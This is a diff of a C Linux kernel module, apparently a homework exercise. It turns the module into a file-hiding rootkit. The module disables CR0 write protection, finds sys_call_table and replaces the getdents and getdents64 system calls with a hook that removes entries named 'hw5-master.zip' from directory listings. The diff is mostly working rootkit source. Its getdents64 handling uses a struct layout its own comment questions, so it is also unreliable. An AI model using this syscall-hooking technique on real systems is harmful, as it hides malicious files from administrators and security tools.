@@ -25,41 +25,52 @@ typedef struct linux_dirent {
 }linux_dirent;
 
 asmlinkage int (*original_getdents)(unsigned int,struct linux_dirent*, unsigned int);
-asmlinkage int (*original_getdents64)(unsigned int,struct linux_dirent*, unsigned int);
+asmlinkage int (*original_getdents64)(unsigned int,struct linux_dirent*, unsigned int);//not sure which one of the two constants the kernel uses
 
 asmlinkage int new_getdents(unsigned int fd,struct linux_dirent* dirp,
                     unsigned int count){
     int bytesread = original_getdents(fd,dirp,count);
-    printk("succesfully executed getdents with %d bytes read \n",bytesread);
-    /*int bytes;
-    for(bytes = 0; bytes < bytesread;){
-        linux_dirent* d = (linux_dirent*) (dirp + bytes);
-        printk("%s\n",d->d_name);
-        bytes += d->d_reclen;
-    }*/
+    int newBytes = bytesread;
+    printk("succesfully executed getdents with %d bytes read, filename %s \n",bytesread, dirp->d_name);
+    int bytes;
+    for(bytes = 0; bytes < newBytes;){
+        linux_dirent* d = (linux_dirent*) (((void*)(dirp)) + bytes);
+        printk("%s: bytes long: %d\n",d->d_name,d->d_reclen);
+        printk("inode number: %lu", d->d_ino);
+        if(strcmp(d->d_name,"hw5-master.zip") == 0){
+            printk("Match found for Desktop. Hiding from dirent entries.");
+            void* alteredBuffer = (((void*)(dirp)) + bytes) + d->d_reclen;
+            int removedEntrySize = d->d_reclen;
+            int copySize = newBytes - bytes - removedEntrySize;
+            memcpy(d,alteredBuffer,copySize);
+            newBytes -= removedEntrySize;
+            continue;
+        }
+        else
+            bytes += d->d_reclen;
+    }
     printk("hello world its getdents function");
-    return bytesread;
+    return newBytes;
 }
 
 int init_module(){
-    write_cr0 (read_cr0 () & (~ 0x10000));
+    write_cr0 (read_cr0 () & (~ 0x10000));//necessary to make the sys_call_table writable
     syscall_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
     printk("loaded syscall table\n");
-    original_getdents = (void*)syscall_table[__NR_getdents];
+    original_getdents = (void*)syscall_table[__NR_getdents];//get original function
 	original_getdents64 = (void*)syscall_table[__NR_getdents64];
-    syscall_table[__NR_getdents64] = (unsigned long*)new_getdents;
+    syscall_table[__NR_getdents64] = (unsigned long*)new_getdents;//replace function
 	syscall_table[__NR_getdents] = (unsigned long*)new_getdents;
-    //original_getdents = *(((void**)syscall_table)+61);//[__NR_getdents64];
-    ///*syscall_table[__NR_getdents64]*/ *(((void**)syscall_table)+61) = (void*)&new_getdents;
-    write_cr0 (read_cr0 () | 0x10000);
+
+    write_cr0 (read_cr0 () | 0x10000);//necessary to restore syscall table to read only
     return 0;
 }
 
 void cleanup_module(){
     write_cr0 (read_cr0 () & (~ 0x10000));
-    syscall_table[__NR_getdents64] = ((unsigned long*)original_getdents64);
+    syscall_table[__NR_getdents64] = ((unsigned long*)original_getdents64);//restore original functions
 	syscall_table[__NR_getdents] = ((unsigned long*)original_getdents);
-    ///*syscall_table[__NR_getdents64]*/*(((void**)syscall_table)+61) = (void*)original_getdents;
+
 	printk("successfully unloaded kernel module");
     write_cr0 (read_cr0 () | 0x10000);
 }
